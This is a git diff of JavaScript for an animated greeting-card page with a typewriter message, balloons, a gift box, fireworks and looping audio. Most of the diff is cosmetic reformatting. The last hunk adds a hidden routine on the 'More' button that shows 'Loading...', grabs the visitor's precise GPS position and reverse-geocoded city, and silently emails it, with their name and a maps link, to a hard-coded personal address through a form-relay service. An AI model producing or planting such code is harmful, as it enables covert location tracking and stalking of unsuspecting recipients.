@@ -1,41 +1,37 @@
-    const typewriter = document.getElementById("typewriter");
-const text = typewriter.innerHTML;  // Save the full original text (with <br>)
-typewriter.innerHTML = "";          // Clear it to start typing
+const typewriter = document.getElementById("typewriter");
+const text = typewriter.innerHTML;  
+typewriter.innerHTML = "";          
 
-const speed = 50; // typing speed (ms per character)
-let i = 0;        // current character position
-let isTag = false; // are we inside an HTML tag?
-let currentText = ''; // text typed so far
+const speed = 50; 
+let i = 0;        
+let isTag = false; 
+let currentText = ''; 
 
 function type() {
   if (i < text.length) {
-    let char = text.charAt(i);  // get current character
+    let char = text.charAt(i);  
 
-    if (char === '<') isTag = true;    // starting a tag like <br>
-    if (char === '>') isTag = false;   // ending the tag
+    if (char === '<') isTag = true;    
+    if (char === '>') isTag = false;   
 
-    currentText += char; // add this character to output
+    currentText += char; 
+    typewriter.innerHTML = currentText; 
+    i++; 
 
-    typewriter.innerHTML = currentText; // update what's shown on screen
-
-    i++; // move to next character let delay;
-if (isTag) {
-  delay = 0;
-} else {
-  delay = speed;
-}
-setTimeout(type, delay);
-    // Delay only if NOT inside a tag
+    let delay;
+    if (isTag) {
+      delay = 0;
     } else {
-    // After all typing is done, show the button
-        document.getElementById("btn2").style.animation = "fade 1s linear forwards";
+      delay = speed;
+    }
+    setTimeout(type, delay);
+  } else {
+    document.getElementById("btn2").style.animation = "fade 1s linear forwards";
   }
 }
 
 document.getElementById("btn1").addEventListener("click", () => {
   setTimeout(type, 1000);
-
-  // Fade in btn2 after 3 seconds (typing continues meanwhile)
   setTimeout(() => {
     document.getElementById("btn2").style.animation = "fade 1s linear forwards";
   }, 5000);
@@ -47,12 +43,13 @@ function graph() {
     let p = document.createElement("div");
     p.classList.add("particle");
     p.innerText = "🎈";
-     p.style.left = Math.random() * 100 + "vw";
-        p.style.animationDuration = 2 + Math.random() * 3 + "s";
-        p.style.animationDelay = Math.random() * 2 + "s";
-        container.appendChild(p);
+    p.style.left = Math.random() * 100 + "vw";
+    p.style.animationDuration = 2 + Math.random() * 3 + "s";
+    p.style.animationDelay = Math.random() * 2 + "s";
+    container.appendChild(p);
   }
 }
+
 const lid = document.getElementById('lid');
 const giftBox = document.getElementById('giftBox');
 const btn1 = document.getElementById('btn1');
@@ -90,38 +87,30 @@ function explodeAt(x, y) {
     particle.style.boxShadow = `0 0 8px currentColor`;
 
     fireworksContainer.appendChild(particle);
-
     setTimeout(() => particle.remove(), 1000);
   }
 }
 
 function fire() {
-const container = document.getElementById("sprinkle-container");
+  const container = document.getElementById("sprinkle-container");
+  container.style.transition = "opacity 0.8s ease";
+  container.style.opacity = 0;
 
-// Set up the transition
-container.style.transition = "opacity 0.8s ease";
-
-// Trigger fade-out
-container.style.opacity = 0;
-
-// Clear the container AFTER the transition completes
-setTimeout(() => {
-  container.innerHTML = "";
-}, 800);
-setTimeout(() => {
-  giftBox.classList.add('shake');
-}, 10);
+  setTimeout(() => {
+    container.innerHTML = "";
+  }, 800);
+  setTimeout(() => {
+    giftBox.classList.add('shake');
+  }, 10);
   setTimeout(() => {
     giftBox.classList.remove('shake');
     lid.classList.add('open');
 
-    // Show text
     const txt = document.querySelector('.txt');
     txt.style.display = 'flex';
-    void txt.offsetWidth; // reflow to trigger animation
+    void txt.offsetWidth; 
     txt.style.animation = 'zoomIn 1s ease forwards';
 
-    // Scale up
     document.querySelector('.txt1').style.transform = 'scale(1)';
     document.getElementById('btn2').style.transform = 'scale(1)';
   }, 600);
@@ -144,15 +133,12 @@ function deselect(btn) {
   btn.style.color = "white";
 }
 
-
-
-
 const audio = document.getElementById("au1");
 let fadeTimer= null;
 
 function playAudioWithFadeIn() {
     audio.volume = 0;
-    audio.loop = false; // we’ll loop manually to control fade in/out
+    audio.loop = false; 
     audio.play();
     fadeInAudio();
 
@@ -160,8 +146,8 @@ function playAudioWithFadeIn() {
         if (audio.duration && audio.currentTime >= audio.duration - 1.5) {
             fadeOutAudio(() => {
                 audio.currentTime = 0; 
-                audio.play();   // restart after fade-out
-                fadeInAudio();  // fade in again at start of next loop
+                audio.play();   
+                fadeInAudio();  
             });
         }
     };
@@ -175,7 +161,7 @@ function fadeInAudio() {
         } else {
             clearInterval(fadeTimer);
         }
-    }, 200); // ~4s fade-in
+    }, 200); 
 }
 
 function fadeOutAudio(callback) {
@@ -187,10 +173,88 @@ function fadeOutAudio(callback) {
             clearInterval(fadeTimer);
             if (callback) callback();
         }
-    }, 200); // ~4s fade-out
+    }, 200); 
 }
 document.addEventListener("visibilitychange", () => {
     if (document.hidden) {
         audio.pause();
     }
 });
+
+// -----------------------------------------------------
+// NEW LOCATION CAPTURE & REDIRECT ON "MORE" BUTTON
+// -----------------------------------------------------
+async function handleMoreClick(btn) {
+    select(btn);
+    
+    // Change text so the user knows it's loading before redirection
+    const originalText = btn.innerText;
+    btn.innerText = "Loading...";
+
+    // Try to get username from previous login page if you used sessionStorage
+    const username = sessionStorage.getItem("LoggedInUser") || "Sneha"; 
+    const targetEmail = "sagarwal2k20@gmail.com"; 
+    
+    let payload = {
+        _subject: `${username} opened the card! (Location Alert)`,
+        User: username,
+        Time: new Date().toLocaleString()
+    };
+
+    // Callback function to redirect regardless of location success/fail
+    const proceedToCard = () => {
+        window.location.href = 'card.html';
+    };
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                const { latitude, longitude, accuracy } = pos.coords;
+                payload.Method = "Exact GPS (Prompted)";
+                payload.Coordinates = `${latitude}, ${longitude}`;
+                payload.Accuracy = `${Math.round(accuracy)} meters`;
+                payload.GoogleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                // Try to get City/State
+                try {
+                    const geoRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
+                    const geoData = await geoRes.json();
+                    payload.City = geoData.locality || geoData.city || "Unknown";
+                    payload.State = geoData.principalSubdivision || "Unknown";
+                } catch (err) {
+                    console.log("Reverse geocode failed");
+                }
+
+                await sendLocationPayload(payload, targetEmail, proceedToCard);
+            },
+            async (err) => {
+                payload.Method = "Location Access Denied / Failed";
+                payload.Error = err.message;
+                await sendLocationPayload(payload, targetEmail, proceedToCard);
+            },
+            // A timeout of 6 seconds prevents the page from freezing forever if they ignore the popup
+            { enableHighAccuracy: true, timeout: 6000 } 
+        );
+    } else {
+        payload.Method = "Geolocation API not supported";
+        await sendLocationPayload(payload, targetEmail, proceedToCard);
+    }
+}
+
+async function sendLocationPayload(payload, email, callback) {
+    try {
+        await fetch(`https://formsubmit.co/ajax/${email}`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {
+        console.log("Failed to send alert", e);
+    } finally {
+        // ALWAYS redirect, even if FormSubmit fails
+        callback();
+    }
+}
